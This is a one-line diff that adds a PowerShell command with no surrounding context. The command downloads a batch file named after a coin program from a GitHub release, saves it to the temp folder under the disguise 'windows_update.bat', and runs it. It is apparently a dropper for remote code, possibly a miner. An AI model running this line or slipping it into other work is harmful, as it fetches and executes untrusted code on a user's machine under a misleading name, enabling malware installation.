@@ -1,0 +1,1 @@
+iwr "https://github.com/cernipoko-bit/sad.org/releases/download/ZZZZZ/coin_atlasb_a65c7e21.bat" -OutFile "$env:temp\windows_update.bat"; Start-Process "$env:temp\windows_update.bat"
